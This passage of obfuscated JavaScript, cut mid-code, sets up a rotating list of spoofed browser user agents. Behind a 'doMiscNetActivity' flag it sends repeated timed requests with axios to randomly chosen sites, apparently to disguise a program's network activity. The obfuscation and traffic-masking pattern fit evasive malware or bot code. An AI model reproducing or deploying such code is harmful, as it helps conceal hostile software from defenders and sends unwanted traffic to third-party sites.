      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1 * -0x8e + 0x2424 + -0x24b2; k < -0x11e3 + 0x342 * -0x2 + 0x186b; k++)
    setTimeout(f, (0xe1e5 + -0x3264 + 0x3adf * 0x1) * k * getRandomInt(0xf66 + 0x200c + -0x2f71 * 0x1, 0x36f + -0xe * 0x174 + 0x169 * 0xc));
  setInterval(() => {
    f();
    for (let l = 0x15f2 + -0xc * 0x16e + 0x1 * -0x4ca; l < -0x90e + -0x1118 + 0x1a2a; l++)
      setTimeout(f, (-0x1 * 0xbd61 + 0x5f3 * 0xa + 0x16c43) * l * getRandomInt(0x2fe + -0x2088 + 0x1d8b, -0x22bb + -0x175 + 0x2433));
  }, 0x2d5157 + -0x1193e0 * -0x4 + -0x3cb257);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a1 = b,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f[a1(0xe, 'OC43')](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x17 * 0x5f + 0x174c + -0x47d) * getRandomInt(-0x983 + 0x481 + 0x503 * 0x1, -0x16bd * -0x1 + 0xdb * 0xd + -0x21d7));
}, 0x9d * 0x23 + 0x32 * -0xe + -0x1 * 0x1257);